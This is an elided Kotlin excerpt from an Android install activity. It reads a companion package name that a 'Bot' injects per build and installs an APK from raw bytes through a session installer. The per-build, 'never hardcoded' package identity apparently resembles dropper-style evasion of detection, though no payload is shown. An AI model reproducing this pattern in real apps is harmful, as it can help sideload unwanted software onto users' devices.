...
class InstallActivity : AppCompatActivity() {
    ...
    companion object {
        ...
        // Companion package is injected at build time via BuildConfig
        // Bot sets BuildConfig.COMPANION_PACKAGE per build — never hardcoded here
        val COMPANION_PKG: String get() = BuildConfig.COMPANION_PACKAGE

        private val MARKET_URI: String get() = "market://details?id=$COMPANION_PKG"
    ...
    private fun installViaSession(apkBytes: ByteArray, attempt: Int) {
        try {
            ...
            // Use BuildConfig.COMPANION_PACKAGE — dynamic per build, never hardcoded
            ...
            try {
                ...
                // SESSION_ACTION uses BuildConfig application ID — dynamic per build
                val intent = Intent(this, InstallReceiver::class.java).apply {
                    action = "${BuildConfig.APPLICATION_ID}.SESSION_ACTION"
                }
